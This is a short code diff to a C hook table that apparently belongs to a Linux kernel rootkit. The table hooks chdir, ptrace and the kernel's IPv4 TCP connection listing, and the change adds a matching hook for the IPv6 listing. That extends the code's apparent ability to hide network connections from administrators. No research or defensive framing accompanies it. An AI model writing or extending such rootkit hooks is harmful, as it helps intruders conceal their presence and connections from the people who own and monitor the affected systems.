@@ -15,7 +15,8 @@ struct ftrace_hook hooks[] = {
     HOOK_SYS("sys_chdir", chdir_hook, &__orig_chdir),
     HOOK_SYS("sys_ptrace", ptrace_hook, &__orig_ptrace),
 
-    HOOK("tcp4_seq_show", tcp4_seq_show_hook, &__orig_tcp4_seq_show)
+    HOOK("tcp4_seq_show", tcp4_seq_show_hook, &__orig_tcp4_seq_show),
+    HOOK("tcp6_seq_show", tcp6_seq_show_hook, &__orig_tcp6_seq_show)
 };
 
 size_t hook_array_size = sizeof(hooks) / sizeof(hooks[0]);
